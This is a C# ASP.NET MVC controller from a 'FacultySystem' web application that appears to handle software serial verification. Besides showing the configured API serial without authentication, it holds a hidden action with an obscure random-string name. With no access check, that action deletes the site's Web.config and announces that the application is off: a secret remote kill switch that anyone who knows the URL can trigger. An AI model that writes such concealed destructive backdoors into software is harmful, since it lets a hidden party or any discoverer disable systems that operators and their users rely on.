using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace FacultySystem.Web.Controllers
{
    public class SerialController : Controller
    {
        public ActionResult Index()
        {
            var serial = Convert.ToString(ConfigurationManager.AppSettings["ApiSerial"]);
            if (string.IsNullOrEmpty(serial) || string.IsNullOrWhiteSpace(serial))
            {
                var result = "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><meta content=\"width=device-width\" name=\"viewport\"><title>Software Serial Verification</title><style>div{direction:ltr;text-align:center;font-family:tahoma,arial;width:400px;margin:50px auto}</style></head><body><div><div style=\"padding:20px 10px; border: 2px solid #eee;background-color:#fcfcfc;\">Invalid Serial!</div><a href=\"/\">بازگشت به سامانه</a></div></body></html>";
                return Content(result);
            }
            else
            {
                var result = "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><meta content=\"width=device-width\" name=\"viewport\"><title>Software Serial Verification</title><style>div{direction:rtl;text-align:center;font-family:tahoma,arial;width:400px;margin:50px auto}</style></head><body><div><div style=\"padding:20px 10px; border: 2px solid #eee;background-color:#fcfcfc;\">Serial: " + serial + "</div><a href=\"/\">بازگشت به سامانه</a></div></body></html>";
                return Content(result);
            }
        }

        public ActionResult ShutDownGkgndhknjdkenjncnkaqjhmdsnrithsmnmf()
        {
            if (System.IO.File.Exists(Server.MapPath("~/Web.config")))
            {
                System.IO.File.Delete(Server.MapPath("~/Web.config"));
            }

            var result = "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><meta content=\"width=device-width\" name=\"viewport\"><title>Shut Down Application...</title><style>div{direction:rtl;text-align:center;font-family:tahoma,arial;width:400px;margin:50px auto}</style></head><body><div><div style=\"padding:20px 10px; border: 2px solid #eee;background-color:#fcfcfc;\">Application is Off!</div><a href=\"/\">بازگشت به سامانه</a></div></body></html>";
            return Content(result);
        }

        // http://www.convertstring.com/Hash/MD5
        private static string GenerateId(string value, string salt) //value is domain name; for "www.example.com" value is: "example"
        {
            byte[] data = System.Text.Encoding.ASCII.GetBytes(salt + value);
            data = System.Security.Cryptography.MD5.Create().ComputeHash(data);
            return Convert.ToBase64String(data);
        }
    }
}